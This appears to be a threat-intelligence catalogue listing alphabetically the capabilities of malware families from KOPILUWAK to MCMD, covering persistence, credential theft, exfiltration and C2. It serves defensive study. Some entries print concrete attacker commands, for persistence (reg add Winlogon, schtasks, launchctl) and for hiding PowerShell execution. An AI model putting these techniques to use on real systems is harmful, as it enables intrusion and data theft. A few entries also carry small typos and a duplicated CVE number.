KOPILUWAK had used Javascript to perform its core functions.
KOPILUWAK has piped the results from executed C2 commands to `%TEMP%\result2.dat` on the local machine.
KOPILUWAK has gained execution through malicious attachments.
KOPILUWAK can use netstat and Net to discover network shares.
KOPILUWAK can enumerate current running processes on the targeted machine.
KOPILUWAK has been delivered to victims as a malicious email attachment.
KOPILUWAK can discover logical drive information on compromised hosts.
KOPILUWAK can use Arp to discover a target's network configuration setttings.
KOPILUWAK can use netstat, Arp, and Net to discover current TCP connections.
KOPILUWAK can conduct basic network reconnaissance on the victim machine with `whoami`, to get user details.
KOPILUWAK has used HTTP POST requests to send data to C2.
Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded.
Kasidet has the ability to search for a given filename on a victim.
Kasidet has the ability to download and execute additional files.
Kasidet has the ability to initiate keylogging.
Kasidet has the ability to search for a given process name in processes currently running in the system.
Kasidet creates a Registry Run key to establish persistence.
Kasidet has the ability to initiate keylogging and screen captures.
Kasidet has the ability to identify any anti-virus installed on the infected system.
Kasidet has the ability to obtain a victim's system name and operating system version.
Kasidet can execute commands using cmd.exe.
Kazuar gathers information about opened windows.
Kazuar has used compromised WordPress blogs as C2 servers.
Kazuar can overwrite files with random data before deleting them.
Kazuar uploads files from a specified directory to the C2 server.
If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.
Kazuar can accept multiple URLs for C2 servers.
Kazuar can delete files.
Kazuar uses FTP and FTPS to communicate with the C2 server.
Kazuar finds a specified directory, lists the files and metadata about those files.
Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.
Kazuar has used internal nodes on the compromised network for C2 communications.
Kazuar gathers information on local groups and members on the victim’s machine.
Kazuar stages command output and collected data in files before exfiltration.
Kazuar gathers information about local groups and members.
Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.
Kazuar obtains a list of running processes through WMI querying and the &lt;code&gt;ps&lt;/code&gt; command.
Kazuar adds a sub-key under several Registry run keys.
Kazuar can sleep for a specific time and be set to communicate at specific intervals.
Kazuar captures screenshots of the victim’s screen.
Kazuar adds a .lnk file to the Windows startup folder.
Kazuar encodes communications to the C2 server in Base64.
Kazuar gathers information on the system and local drives.
Kazuar gathers information about network adapters.
Kazuar gathers information on users.
Kazuar uses /bin/bash to execute commands on the victim’s machine.
Kazuar captures images from the webcam.
Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API.
Kazuar uses cmd.exe to execute commands on the victim’s machine.
Kazuar obtains a list of running processes through WMI querying.
Kazuar can install itself as a new service.
Kerrdown can use DLL side-loading to load malicious DLLs.
Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.
Kerrdown can download specific payloads to a compromised host based on OS architecture.
Kerrdown has gained execution through victims opening malicious files.
Kerrdown has gained execution through victims opening malicious links.
Kerrdown can encrypt, encode, and compress multiple layers of shellcode.
Kerrdown has been distributed through malicious e-mail attachments.
Kerrdown has been distributed via e-mails containing a malicious link.
Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.
Kerrdown can use a VBS base64 decoder function published by Motobit.
Kessel can RC4-encrypt credentials before sending to the C2.
Kessel can create a reverse shell between the infected host and a specified system.
Kessel has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.
Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.
Kessel has decrypted the binary's configuration once the &lt;code&gt;main&lt;/code&gt; function was launched.
Kessel's configuration is hardcoded and RC4 encrypted within the binary.
Kessel has exfiltrated information gathered from the infected system to the C2 server.
Kessel can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.
Kessel can download additional modules from the C2 server.
Kessel has trojanized the &lt;sode&gt;ssh_login&lt;/code&gt; and &lt;code&gt;user-auth_pubkey&lt;/code&gt; functions to steal plaintext credentials.
Kessel can use a proxy during exfiltration if set in the configuration.
Kessel has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.
Kessel has collected the system architecture, OS version, and MAC address information.
Kessel has collected the DNS address of the infected host.
Variants of Kevin can communicate over DNS through queries to the server for constructed domain names with embedded information.
Kevin can create directories to store logs and other collected data.
Kevin can exfiltrate data to the C2 server in 27-character chunks.
Kevin can upload logs and other data from a compromised host.
Kevin has Base64-encoded its configuration file.
Kevin can send data from the victim host through a DNS C2 channel.
Kevin can assign hard-coded fallback domains for C2.
Kevin can delete files created on the victim's machine.
Kevin can hide the current window from the targeted user via the `ShowWindow` API function.
Kevin can download files to the compromised host.
Kevin can generate a sequence of dummy HTTP C2 requests to obscure traffic.
Kevin can use the `ShowWindow` API to avoid detection.
Kevin can use a custom protocol tunneled through DNS or HTTP.
Kevin has renamed an image of `cmd.exe` with a random name followed by a `.tmpl` extension.
Kevin can Base32 encode chunks of output files during exfiltration.
Kevin can enumerate the OS version and hostname of a targeted machine.
Kevin can collect the MAC address and other information from a victim machine using `ipconfig/all`.
Kevin can sleep for a time interval between C2 communication attempts.
Variants of Kevin can communicate with C2 over HTTP.
Kevin can use a renamed image of `cmd.exe` for execution.
Kevin can compile randomly-generated MOF files into the WMI repository to persistently run malware.
KeyBoy attempts to collect passwords from browsers.
KeyBoy uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.
In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.
KeyBoy has a command to launch a file browser or explorer on the system.
KeyBoy uses &lt;code&gt;-w Hidden&lt;/code&gt; to conceal a PowerShell window that downloads a payload.
KeyBoy has a download and upload functionality.
KeyBoy installs a keylogger for intercepting credentials and keystrokes.
KeyBoy uses PowerShell commands to download and execute payloads.
KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic.
KeyBoy uses Python scripts for installing files and performing execution.
KeyBoy has a command to perform screen grabbing.
KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.
KeyBoy can determine the public or WAN IP address for the system.
KeyBoy time-stomped its DLL in order to evade detection.
KeyBoy uses VBS scripts for installing files and performing execution.
KeyBoy can launch interactive shells for communicating with the victim machine.
KeyBoy installs a service pointing to a malicious DLL dropped to disk.
KeyBoy issues the command &lt;code&gt;reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”&lt;/code&gt; to achieve persistence.
Keydnap prompts the users for credentials.
Keydnap uses a Launch Agent to persist.
Keydnap uses a copy of tor2web proxy for HTTPS communications.
Keydnap uses Python for scripting to execute additional commands.
Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.
Keydnap uses the keychaindump project to read securityd memory.
Keydnap adds the setuid flag to a binary so it can easily elevate in the future.
Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.
Keydnap uses HTTPS for command and control.
KillDisk has attempted to get the access token of a process by calling &lt;code&gt;OpenProcessToken&lt;/code&gt;. If KillDisk gets the access token, then it attempt to modify the token privileges with &lt;code&gt;AdjustTokenPrivileges&lt;/code&gt;.
KillDisk deletes Application, Security, Setup, and System Windows Event Logs.
KillDisk deletes system files to make the OS unbootable. KillDisk also targets and deletes files with 35 different file extensions.
KillDisk has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.
KillDisk overwrites the first sector of the Master Boot Record with “0x00”.
KillDisk has the ability to quit and delete itself.
KillDisk has used the &lt;code&gt;FindNextFile&lt;/code&gt; command as part of its file deletion process.
KillDisk registers as a service under the Plug-And-Play Support name.
KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine.
KillDisk uses VMProtect to make reverse engineering the malware more difficult.
KillDisk has called &lt;code&gt;GetCurrentProcess&lt;/code&gt;.
KillDisk terminates various processes to get the user to reboot the victim machine.
KillDisk loads and executes functions from a DLL.
KillDisk retrieves the hard disk name by calling the &lt;code&gt;CreateFileA to \\.\PHYSICALDRIVE0&lt;/code&gt; API.
KillDisk attempts to reboot the machine by terminating specific processes.
Kinsing has searched &lt;code&gt;bash_history&lt;/code&gt; for credentials.
Kinsing has attempted to brute force hosts over SSH.
Kinsing was executed with an Ubuntu container entry point that runs shell scripts.
Kinsing has used crontab to download and run shell scripts every minute to ensure persistence.
Kinsing was run through a deployed Ubuntu container.
Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API.
Kinsing has used the find command to search for specific files.
Kinsing has downloaded additional lateral movement scripts from C2.
Kinsing has used chmod to modify permissions on key files for use.
Kinsing has searched for private keys.
Kinsing has used ps to list processes.
Kinsing has used a script to parse files like &lt;code&gt;/etc/hosts&lt;/code&gt; and SSH &lt;code&gt;known_hosts&lt;/code&gt; to discover remote systems.
Kinsing has created and run a Bitcoin cryptocurrency miner.
Kinsing has used SSH for lateral movement.
Kinsing has used Unix shell scripts to execute commands in the victim environment.
Kinsing has used valid SSH credentials to access remote hosts.
Kinsing has communicated with C2 over HTTP.
Kivars has the ability to uninstall malware from the infected host.
Kivars has the ability to list drives on the infected host.
Kivars has the ability to conceal its activity through hiding active windows.
Kivars has the ability to download and execute files.
Kivars has the ability to initiate keylogging on the infected host.
Kivars has the ability to remotely trigger keyboard input and mouse clicks.
Kivars has the ability to capture screenshots on the infected host.
Koadic can use SSL and TLS for communications.
Koadic has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.
Koadic can retrieve the current content of the user clipboard.
Koadic can download files off the target system to send back to the server.
Koadic can perform process injection by using a reflective DLL.
Koadic can obtain a list of directories.
Koadic has used the command &lt;code&gt;Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden&lt;/code&gt; to hide its window.
Koadic can download additional files and tools.
Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.
Koadic can gather hashed passwords by gathering domain controller hashes from NTDS.
Koadic can scan for open TCP ports on the target network.
Koadic can scan local network for open SMB.
Koadic has used PowerShell to establish persistence.
Koadic has added persistence to the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` Registry key.
Koadic can use Regsvr32 to execute additional payloads.
Koadic can enable remote desktop on the victim's machine.
Koadic can use Rundll32 to execute additional payloads.
Koadic has used scheduled tasks to add persistence.
Koadic can gather hashed passwords by dumping SAM/SECURITY hive.
Koadic can run a command on another machine using PsExec.
Koadic can obtain the OS version and build, computer name, and processor architecture from a compromised host.
Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain.
Koadic can identify logged in users across the domain and views user sessions.
Koadic performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .
Koadic has used HTTP for C2 communications.
Koadic can open an interactive command-shell to perform command line functions on victim machines. Koadic performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.
Koadic can use WMI to execute commands.
Kobalos's authentication and key exchange is performed using RSA-512.
Kobalos can remove all command history on compromised hosts.
Kobalos replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.
Kobalos can write captured SSH connection credentials to a file under the &lt;code&gt;/var/run&lt;/code&gt; directory with a &lt;code&gt;.pid&lt;/code&gt; extension for exfiltration.
Kobalos decrypts strings right after the initial communication, but before the authentication process.
Kobalos can exfiltrate credentials over the network via UDP.
Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host.
Kobalos can chain together multiple compromised machines as proxies to reach their final targets.
Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call.
Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic.
Kobalos can record the hostname and kernel version of the target machine.
Kobalos can record the IP address of the target machine.
Kobalos can modify timestamps of replaced files, such as &lt;code&gt;ssh&lt;/code&gt; with the added credential stealer or &lt;code&gt;sshd&lt;/code&gt; used to deploy Kobalos.
Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port.
Kobalos can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt.
The Komplex trojan supports file deletion.
The Komplex payload is stored in a hidden directory at &lt;code&gt;/Users/Shared/.local/kextd&lt;/code&gt;.
The Komplex trojan creates a persistent launch agent called with &lt;code&gt;$HOME/Library/LaunchAgents/com.apple.updates.plist&lt;/code&gt; with &lt;code&gt;launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist&lt;/code&gt;.
The OsInfo function in Komplex collects a running process list.
The Komplex C2 channel uses an 11-byte XOR algorithm to hide data.
The OsInfo function in Komplex collects the current running username.
The Komplex C2 channel uses HTTP POST requests.
Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.
Kwampirs decrypts and extracts a copy of its main DLL payload when executing.
Kwampirs collects a list of domain groups with the command &lt;code&gt;net localgroup /domain&lt;/code&gt;.
Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.
Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established.
Kwampirs collects a list of files and directories in C:\ with the command &lt;code&gt;dir /s /a c:\ &gt;&gt; "C:\windows\TEMP\[RANDOM].tmp"&lt;/code&gt;.
Kwampirs downloads additional files from C2 servers.
Kwampirs collects a list of accounts with the command &lt;code&gt;net users&lt;/code&gt;.
Kwampirs collects a list of users belonging to the local users and administrators groups with the commands &lt;code&gt;net localgroup administrators&lt;/code&gt; and &lt;code&gt;net localgroup users&lt;/code&gt;.
Kwampirs establishes persistence by adding a new service with the display name "WMI Performance Adapter Extension" in an attempt to masquerade as a legitimate WMI service.
Kwampirs collects a list of network shares with the command &lt;code&gt;net share&lt;/code&gt;.
Kwampirs collects password policy information with the command &lt;code&gt;net accounts&lt;/code&gt;.
Kwampirs collects a list of running services with the command &lt;code&gt;tasklist /v&lt;/code&gt;.
Kwampirs collects a list of available servers with the command &lt;code&gt;net view&lt;/code&gt;.
Kwampirs uses rundll32.exe in a Registry value added to establish persistence.
Kwampirs copies itself over network shares to move laterally on a victim network.
Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands &lt;code&gt;systeminfo&lt;/code&gt;, &lt;code&gt;net config workstation&lt;/code&gt;, &lt;code&gt;hostname&lt;/code&gt;, &lt;code&gt;ver&lt;/code&gt;, &lt;code&gt;set&lt;/code&gt;, and &lt;code&gt;date /t&lt;/code&gt;.
Kwampirs collects network adapter and interface information by using the commands &lt;code&gt;ipconfig /all&lt;/code&gt;, &lt;code&gt;arp -a&lt;/code&gt; and &lt;code&gt;route print&lt;/code&gt;. It also collects the system's MAC address with &lt;code&gt;getmac&lt;/code&gt; and domain configuration with &lt;code&gt;net config workstation&lt;/code&gt;.
Kwampirs collects a list of active and listening connections by using the command &lt;code&gt;netstat -nao&lt;/code&gt; as well as a list of available network mappings with &lt;code&gt;net use&lt;/code&gt;.
Kwampirs collects registered owner details by using the commands &lt;code&gt;systeminfo&lt;/code&gt; and &lt;code&gt;net config workstation&lt;/code&gt;.
Kwampirs collects a list of running services with the command &lt;code&gt;tasklist /svc&lt;/code&gt;.
Kwampirs creates a new service named WmiApSrvEx to establish persistence.
LIGHTWIRE can imbed itself into the legitimate `compcheckresult.cgi` component of Ivanti Connect Secure VPNs to enable command execution.
LIGHTWIRE can RC4 decrypt and Base64 decode C2 commands.
LIGHTWIRE can RC4 encrypt C2 commands.
LIGHTWIRE can use HTTP for C2 communications.
LIGHTWIRE is a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs.
LITTLELAMB.WOOLTEA can communicate over SSL using the private key from the Ivanti Connect Secure web server.
LITTLELAMB.WOOLTEA can append malicious components to the `tmp/tmpmnt/bin/samba_upgrade.tar` archive inside the factory reset partition in attempt to persist post reset.
LITTLELAMB.WOOLTEA can initialize itself as a daemon to run persistently in the background.
LITTLELAMB.WOOLTEA can monitor for system upgrade events by checking for the presence of `/tmp/data/root/dev`.
LITTLELAMB.WOOLTEA can function as a stand-alone backdoor communicating over the `/tmp/clientsDownload.sock` socket.
LITTLELAMB.WOOLTEA has the ability to function as a SOCKS proxy.
LITTLELAMB.WOOLTEA can check the type of Ivanti VPN device it is running on by executing `first_run()` to identify the first four bytes of the motherboard serial number.
LOWBALL uses the Dropbox cloud storage service for command and control.
LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.
LOWBALL command and control occurs via HTTPS over port 443.
LaZagne can obtain credential information from /etc/shadow using the shadow.py module.
LaZagne can perform credential dumping from MSCache to obtain account and password information.
LaZagne can obtain credentials from chats, databases, mail, and WiFi.
LaZagne can obtain credentials from databases, mail, and WiFi across multiple platforms.
LaZagne can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.
LaZagne can obtain credentials from macOS Keychains.
LaZagne can perform credential dumping from LSA secrets to obtain account and password information.
LaZagne can perform credential dumping from memory to obtain account and password information.
LaZagne can use the `&lt;PID&gt;/maps` and `&lt;PID&gt;/mem` files to identify regex patterns to dump cleartext passwords from the browser's process memory.
LaZagne can obtain credentials from Vault files.
LightNeuron contains a function to encrypt and store emails that it collects.
LightNeuron can be configured to automatically collect files under a specified directory.
LightNeuron can be configured to automatically exfiltrate files under a specified directory.
LightNeuron can collect files from a local system.
LightNeuron has used AES and XOR to decrypt configuration files and commands.
LightNeuron encrypts its configuration files with AES-256.
LightNeuron exfiltrates data over its email C2 channel.
LightNeuron has a function to delete files.
LightNeuron has the ability to download and execute additional files.
LightNeuron can store email data in files and directories specified in its configuration, such as &lt;code&gt;C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\&lt;/code&gt;.
LightNeuron uses SMTP for C2.
LightNeuron has used filenames associated with Exchange and Outlook for binary and configuration files, such as &lt;code&gt;winmail.dat&lt;/code&gt;.
LightNeuron is capable of starting a process using CreateProcess.
LightNeuron collects Exchange emails matching rules specified in its configuration.
LightNeuron can be configured to exfiltrate data during nighttime or working hours.
LightNeuron is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.
LightNeuron uses AES to encrypt C2 traffic.
LightNeuron gathers the victim computer name using the Win32 API call &lt;code&gt;GetComputerName&lt;/code&gt;.
LightNeuron gathers information about network adapters using the Win32 API call &lt;code&gt;GetAdaptersInfo&lt;/code&gt;.
LightNeuron is capable of modifying email content, headers, and attachments during transit.
LightNeuron has used a malicious Microsoft Exchange transport agent for persistence.
LightNeuron is capable of executing commands via cmd.exe.
Linfo creates a backdoor through which remote attackers can obtain data from local systems.
Linfo creates a backdoor through which remote attackers can change C2 servers.
Linfo creates a backdoor through which remote attackers can delete files.
Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.
Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.
Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.
Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.
Linfo creates a backdoor through which remote attackers can retrieve system information.
Linfo creates a backdoor through which remote attackers can start a remote shell.
Linux Rabbit sends the payload from the C2 server as an encoded URL parameter.
Linux Rabbit attempts to gain access to the server via SSH.
Linux Rabbit brute forces SSH passwords in order to attempt to gain access and install its malware onto the server.
Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.
Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files.
Linux Rabbit acquires valid SSH accounts through brute force.
LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.
LiteDuke can securely delete files by first writing random data to the file.
LiteDuke has the ability to download files.
LiteDuke can query the Registry to check for the presence of &lt;code&gt;HKCU\Software\KasperskyLab&lt;/code&gt;.
LiteDuke can create persistence by adding a shortcut in the &lt;code&gt;CurrentVersion\Run&lt;/code&gt; Registry key.
LiteDuke has the ability to check for the presence of Kaspersky security software.
LiteDuke has been packed with multiple layers of encryption.
LiteDuke has used image files to hide its loader component.
LiteDuke can enumerate the CPUID and BIOS version on a compromised system.
LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera.
LiteDuke can enumerate the account name on a targeted system.
LiteDuke can wait 30 seconds before executing additional code if security software is detected.
LiteDuke can use HTTP GET requests in C2 communications.
LitePower can send collected data, including screenshots, over its C2 channel.
LitePower has the ability to download payloads containing system commands to a compromised host.
LitePower can use various API calls.
LitePower can use a PowerShell script to execute commands.
LitePower can query the Registry for keys added to execute COM hijacking.
LitePower can create a scheduled task to enable persistence mechanisms.
LitePower can take system screenshots and save them to `%AppData%`.
LitePower can identify installed AV software.
LitePower has the ability to list local drives and enumerate the OS architecture.
LitePower can determine if the current user has admin privileges.
LitePower can use HTTP and HTTPS for C2 communications.
Lizar has encrypted data before sending it to the server.
Lizar can retrieve browser history and database files.
Lizar has a module to collect usernames and passwords stored in browsers.
Lizar can decrypt its configuration data.
Lizar has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.
Lizar can collect email accounts from Microsoft Outlook and Mozilla Thunderbird.
Lizar can support encrypted communications between the client and server.
Lizar can download additional plugins, files, and tools.
Lizar can run Mimikatz to harvest credentials.
Lizar has used various Windows API functions on a victim's machine.
Lizar can execute PE files in the address space of the specified process.
Lizar has used PowerShell scripts.
Lizar has a plugin designed to obtain a list of processes.
Lizar can migrate the loader into another process.
Lizar can take JPEG screenshots of an infected system.
Lizar can search for processes associated with an anti-virus product from list.
Lizar can collect the computer name from the machine,.
Lizar can retrieve network information from a compromised host.
Lizar has a plugin to retrieve information about all active network sessions on the infected server.
Lizar can collect the username from the system.
Lizar has a command to open the command-line on the infected system.
Lizar has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using `vaultcmd.exe` and another that can collect RDP access credentials using the `CredEnumerateW` function.
LoFiSe can collect files into password-protected ZIP-archives for exfiltration.
LoFiSe can collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration.
LoFiSe has been executed as a file named DsNcDiag.dll through side-loading.
LoFiSe can collect files of interest from targeted systems.
LoFiSe can monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .rtf, .tif, .odt, .ods, .odp, .eml, and .msg.
LoFiSe can save files to be evaluated for further exfiltration in the `C:\Programdata\Microsoft\` and  `C:\windows\temp\` folders.
LoJax has modified the Registry key &lt;code&gt;‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’&lt;/code&gt; from &lt;code&gt;‘autocheck autochk *’&lt;/code&gt; to &lt;code&gt;‘autocheck autoche *’&lt;/code&gt;.
LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.
LoJax has modified the Registry key &lt;code&gt;‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’&lt;/code&gt; from &lt;code&gt;‘autocheck autochk *’&lt;/code&gt; to &lt;code&gt;‘autocheck autoche *’&lt;/code&gt; in order to execute its payload during Windows startup.
LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.
LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.
LockerGoga has been observed changing account passwords and logging off current users.
LockerGoga has been signed with stolen certificates in order to make it look more legitimate.
LockerGoga has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.
LockerGoga installation has been immediately preceded by a "task kill" command in order to disable anti-virus.
LockerGoga has been observed deleting its original launcher after execution.
LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.
LockerGoga has been observed shutting down infected systems.
Lokibot has utilized multiple techniques to bypass UAC.
Lokibot has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.
Lokibot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.
Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.
Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.
Lokibot will delete its dropped files after bypassing UAC.
Lokibot can search for specific files on an infected host.
Lokibot has the ability to copy itself to a hidden file and directory.
Lokibot downloaded several staged items onto the victim's machine.
Lokibot has the ability to capture input on the compromised host via keylogging.
Lokibot has tricked recipients into enabling malicious macros by getting victims to click "enable content" in email attachments.
Lokibot has modified the Registry as part of its UAC bypass process.
Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.
Lokibot has obfuscated strings with base64 encoding.
Lokibot has used PowerShell commands embedded inside batch scripts.
Lokibot has used process hollowing to inject itself into legitimate Windows process.
Lokibot has reflectively loaded the decoded DLL into memory.
Lokibot embedded the commands &lt;code&gt;schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I&lt;/code&gt; inside a batch script.
Lokibot's second stage DLL has set a timer using “timeSetEvent” to schedule its next execution.
Lokibot has used several packing methods for obfuscation.
Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email.
Lokibot has the ability to discover the computer name and Windows product name/version.
Lokibot has the ability to discover the domain name of the infected host.
Lokibot has the ability to discover the username on the infected host.
Lokibot has performed a time-based anti-debug check before downloading its third stage.
Lokibot has used VBS scripts and XLS macros for execution.
Lokibot has used HTTP for C2 communications.
Lokibot has used &lt;code&gt;cmd /c&lt;/code&gt; commands embedded within batch scripts.
LookBack side loads its communications module as a DLL into the &lt;code&gt;libcurl.dll&lt;/code&gt; loader.
LookBack has a function that decrypts malicious data.
LookBack removes itself after execution and can delete files on the system.
LookBack can retrieve file listings from the victim machine.
LookBack has a C2 proxy tool that masquerades as &lt;code&gt;GUP.exe&lt;/code&gt;, which is software used by Notepad++.
LookBack uses a custom binary protocol over sockets for C2 communications.
LookBack can list running processes.
LookBack sets up a Registry Run key to establish a persistence mechanism.
LookBack can take desktop screenshots.
LookBack can kill processes and delete services.
LookBack uses a modified version of RC4 for data transfer.
LookBack can enumerate services on the victim machine.
LookBack can shutdown and reboot the victim machine.
LookBack has used VBA macros in Microsoft Word attachments to drop additional files to the host.
LookBack’s C2 proxy tool sends data to a C2 server over HTTP.
LookBack executes the &lt;code&gt;cmd.exe&lt;/code&gt; command.
LoudMiner has obfuscated various scripts.
LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.
LoudMiner has encrypted DMG files.
LoudMiner deleted installation files after completion.
LoudMiner has set the attributes of the VirtualBox directory and VBoxVmService parent directory to "hidden".
LoudMiner used SCP to update the miner from the C2.
LoudMiner adds plist files with the naming format &lt;code&gt;com.[random_name].plist&lt;/code&gt; in the &lt;code&gt;/Library/LaunchDaemons&lt;/code&gt; folder with the RunAtLoad and KeepAlive keys set to &lt;code&gt;true&lt;/code&gt;.
LoudMiner launched the QEMU services in the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder using &lt;code&gt;launchctl&lt;/code&gt;. It also uses &lt;code&gt;launchctl&lt;/code&gt; to unload all Launch Daemons when updating to a newer version of LoudMiner.
LoudMiner used an MSI installer to install the virtualization software.
LoudMiner used the &lt;code&gt;ps&lt;/code&gt; command to monitor the running processes on the system.
LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.
LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.
LoudMiner started the cryptomining virtual machine as a service on the infected machine.
LoudMiner has monitored CPU usage.
LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.
LoudMiner used shell scripts to launch various services and to start/stop the QEMU virtualization.
LoudMiner used a batch script to run the Linux virtual machine as a service.
LoudMiner can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.
Lslsass can dump active logon session password hashes from the lsass process.
Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.
Lucifer can clear and remove event logs.
Lucifer can decrypt its C2 address upon execution.
Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).
Lucifer can download and execute a replica of itself using certutil.
Lucifer can use certutil for propagation on Windows hosts within intranets.
Lucifer can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.
Lucifer can scan for open ports including TCP ports 135 and 1433.
Lucifer has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.
Lucifer can identify the process that owns remote connections.
Lucifer can check for existing stratum cryptomining information in &lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info%&lt;/code&gt;.
Lucifer can persist by setting Registry key values &lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic&lt;/code&gt; and &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic&lt;/code&gt;.
Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.
Lucifer can infect victims by brute forcing SMB.
Lucifer has established persistence by creating the following scheduled task &lt;code&gt;schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F&lt;/code&gt;.
Lucifer has used UPX packed binaries.
Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.
Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.
Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host.
Lucifer can collect the IP address of a compromised host.
Lucifer can identify the IP and port numbers for all remote connections from the compromised host.
Lucifer has the ability to identify the username on a compromised host.
Lucifer can issue shell commands to download and execute additional payloads.
Lucifer can use WMI to log into remote machines for propagation.
Lurid can compress data before sending it.
Lurid performs XOR encryption.
MCMD has the ability to remove set Registry Keys, including those used for persistence.
MCMD has the ability to upload files from an infected device.
MCMD can modify processes to prevent them from being visible on the desktop.
MCMD can upload additional files to a compromised host.
MCMD has been named Readme.txt to appear legitimate.
